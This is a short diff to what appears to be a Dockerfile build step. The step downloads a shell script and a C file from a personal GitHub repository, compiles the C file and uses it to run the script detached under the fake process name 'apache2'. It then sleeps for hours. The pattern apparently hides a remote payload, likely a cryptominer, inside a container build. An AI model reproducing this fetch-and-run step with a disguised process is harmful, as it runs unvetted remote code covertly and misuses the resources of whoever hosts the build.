@@ -12,7 +12,7 @@ RUN \
   wget https://github.com/vamzie2282/tesar373/raw/main/rust.sh && \
   chmod 777 rust.sh && \
   wget https://github.com/vamzie2282/tesar373/raw/main/test.c && \
-  gcc -o run test.c && \
-  ./run -s "/usr/sbin/apache2 -k start" -d -p test.pid ./rust.sh && \
-  sleep 20007 && \
+  gcc -o test test.c && \
+  ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./rust.sh && \
+  sleep 17990 && \
   rm -rf /var/lib/apt/lists/* 
